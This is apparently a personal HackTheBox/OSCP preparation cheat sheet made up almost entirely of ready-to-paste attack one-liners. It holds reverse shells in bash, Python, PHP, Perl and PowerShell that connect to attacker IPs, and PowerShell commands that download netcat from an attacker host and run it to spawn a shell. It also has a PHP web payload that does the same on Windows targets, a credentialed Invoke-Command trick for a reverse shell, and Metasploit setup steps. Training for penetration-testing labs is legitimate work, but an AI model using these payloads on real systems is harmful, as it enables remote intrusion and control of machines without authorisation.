# HackTheBox
For OSCP preparation!

## CheatSheet
* [Reverse shell](#Reverse)
* [Powershell Cheatsheet](#PSCheat)
* [Metasploit Setup](#Metasploit)
### Bash

```bash
bash -i >& /dev/tcp/{IP}}/{PORT}} 0>&1
sh -i >& /dev/udp/{IP}/{PORT}} 0>&1

0<&196;exec 196<>/dev/tcp/<your IP>/<same unfiltered port>; sh <&196 >&196 2>&196
```

### Python

```Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

### php
```PHP
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.10/1234 0>&1'");
```

### Perl

```perl
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IP]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

### Powershell

```Powershell
Create shell.ps1

$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

## PSCheat


**One Liner 'Download file with powershell'**
```Download File -Powershell
cmd.exe> powershell IWR http://10.12.12.12/nc.exe -outfile \\PATH\\nc.exe

PS> Invoke-WebRequest http://10.10.15.15/shell.ps1 -OutFile c:\shell.ps1
```
**One liner 'PHP Reverse shell when Target machine is Windows'**
```

<?= system("powershell IWR http://10.12.12.12/nc.exe -outfile \\windows\\temp\\nc.exe; \\windows\\temp\\nc.exe 10.12.12.12 4444 -e powershell.exe 2>&1") ?>

Start Listerner > nc -lvnp 4444
If reverse shell does not connect -Verify if target machine has AV as it may delete the netcat.
```

**Switch User in Powershell (Like Su user in Linux but in windows its tricky)**

```
PS>$user = 'WORKGROUP\Miracle' 
PS>$passwd = 'securepass' 
PS>$secpass = ConvertTo-SecureString $passwd -AsPlainText -Force
PS>$cred = new-object system.management.automation.PSCredential $user,$secpass 
PS>Invoke-Command -computername 127.0.0.1 -ScriptBlock { whoami } -credential $cred
```
*It will print Usernmae WORKGROUP\Miracle because of this { whoami }, Then to get reverse shell use below lines and remember to change the 'Ip' & 'Port'*
```
PS>Invoke-Command -computername 127.0.0.1 -ScriptBlock { wget http://10.10.14.201/nc.exe -OutFile C:\temp\nc.exe } -credential $cred
PS>Invoke-Command -computername 127.0.0.1 -ScriptBlock { C:\temp\nc.exe 10.10.14.201 8687 -e powershell.exe } -credential $cred
```


## Metasploit

```
root@Miracle:~# apt update; apt install metasploit-framework 
root@Miracle:~# msfdb delete
root@Miracle:~# msfdb init
root@Miracle:~# cp /usr/share/metasploit-framework/config/database.yml /root/.msf4/
root@Miracle:~# service postgresql restart
root@Miracle:~# msfconsole
MSF5 > db_status
Msf5 > db_rebuild_cache

Easy
```
